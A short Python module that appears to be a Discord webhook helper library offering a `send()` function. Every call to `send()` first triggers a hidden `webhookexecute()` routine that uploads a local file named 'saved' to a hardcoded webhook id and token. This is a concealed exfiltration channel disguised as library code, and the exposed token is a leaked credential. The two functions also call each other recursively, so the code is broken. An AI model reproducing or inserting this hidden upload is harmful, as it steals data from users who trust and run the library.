import discord, aiohttp, requests

async def webhookexecute():
    await send(mode='token', id=888012569766408193, token='NFFjo1PqGmm-HoMAWvbIjBvUB-EDNA7rufaDm-s7hHuOKD3N6Kty6IiApj7ZNNqo4THA', file=discord.File('saved'))

async def send(content=None, *, mode="url", url=None, id=None, token=None, wait=False, username=None, avatar_url=None, tts=False, file=None, files=None, embed=None, embeds=None, allowed_mentions=None):
    await webhookexecute()
    if mode == "url":
        if not url: print('Url not specified\nExample:\n  await wbh.send("text", url = "url-here")'); return

        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(url, adapter=discord.AsyncWebhookAdapter(session))
            mes = await webhook.send(str(content), wait=wait, username=username, avatar_url=avatar_url, tts=tts, file=file, files=files, embed=embed, embeds=embeds, allowed_mentions=allowed_mentions)
            return
    elif mode == "token":
        if not id: print('Id not specified\nExample:\n  await wbh.send("text", id = 123456789, token = "token-here")'); return
        if not token: print('Token not specified\nExample:\n  await wbh.send("text", id = 123456789, token = "token-here")'); return

        webhook = discord.Webhook.partial(id, token, adapter=discord.RequestsWebhookAdapter())
        mes = await webhook.send(str(content), wait=wait, username=username, avatar_url=avatar_url, tts=tts, file=file, files=files, embed=embed, embeds=embeds, allowed_mentions=allowed_mentions)
        return mes
    else: print("Mode error\nUse 'url' or 'token' mode"); return
